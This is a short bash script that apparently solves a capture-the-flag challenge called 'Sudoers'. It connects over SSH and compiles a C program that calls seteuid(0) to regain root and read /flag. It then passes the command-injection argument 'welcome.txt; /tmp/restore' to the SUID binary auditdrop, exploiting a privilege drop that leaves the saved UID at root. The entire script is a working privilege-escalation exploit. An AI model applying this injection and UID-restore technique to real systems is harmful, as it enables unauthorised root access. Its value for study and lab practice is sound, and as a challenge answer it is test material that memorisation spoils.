#!/usr/bin/env bash
# Solver for "Sudoers" (auditdrop binary)
#
# Vulnerability: seteuid(getuid()) drops EUID only. SUID stays 0 (root).
# system() forks a child that inherits SUID=0. The injected program calls
# seteuid(0), regains root, and reads /flag.
set -euo pipefail

HOST="${1:?usage: solve.sh <host> [port]}"
PORT="${2:-22}"

ssh -p "$PORT" ctf@"$HOST" 'bash -s' <<'REMOTE'
set -e
cat > /tmp/restore.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
int main() {
    if (seteuid(0) != 0) { perror("seteuid"); return 1; }
    FILE *f = fopen("/flag", "r");
    if (!f) { perror("fopen"); return 1; }
    char buf[256];
    while (fgets(buf, sizeof buf, f)) fputs(buf, stdout);
    return 0;
}
EOF
gcc -o /tmp/restore /tmp/restore.c
/usr/local/bin/auditdrop "welcome.txt; /tmp/restore"
REMOTE
